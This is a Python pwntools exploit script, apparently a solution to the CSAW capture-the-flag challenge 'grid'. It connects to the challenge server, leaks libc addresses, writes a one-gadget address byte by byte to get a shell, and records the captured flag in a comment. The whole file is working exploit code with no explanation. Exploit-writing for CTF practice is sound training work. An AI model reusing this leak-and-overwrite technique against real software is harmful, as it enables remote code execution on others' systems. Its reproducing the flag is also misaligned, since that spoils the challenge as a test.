#exploit for grid
#flag{but_4ll_l4ngu4g3s_R_C:(}
from pwn import *
elf = ELF("./grid")
libc = elf.libc
context.binary=elf
gadget=0x4f365
target=remote('pwn.chal.csaw.io',5013)
def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def attack(shape="\x64",b2=0,b1=12):
	sa("pe> ",shape)
	if(shape=="\x64"):
		target.recvuntil("Displaying\n")
		leaks=target.recvuntil("sha").strip("sha")
		return leaks
	sla("loc> ",str(b1))
	target.sendline(str(b2))	
	return 0
def attack2(shape="\x64"):
	sa("pe> ",shape)
			
leaks=attack()
realleaks=leaks[0]
for i in range(1,len(leaks)):
	if((i+1)%11!=0):
		realleaks+=leaks[i]
libc_base=u64(realleaks[0x10:0x18])-0x7766e0	
libc_gadget=p64(libc_base+gadget)
for i in range(6):
	attack(libc_gadget[i],i)
attack2()
target.interactive()
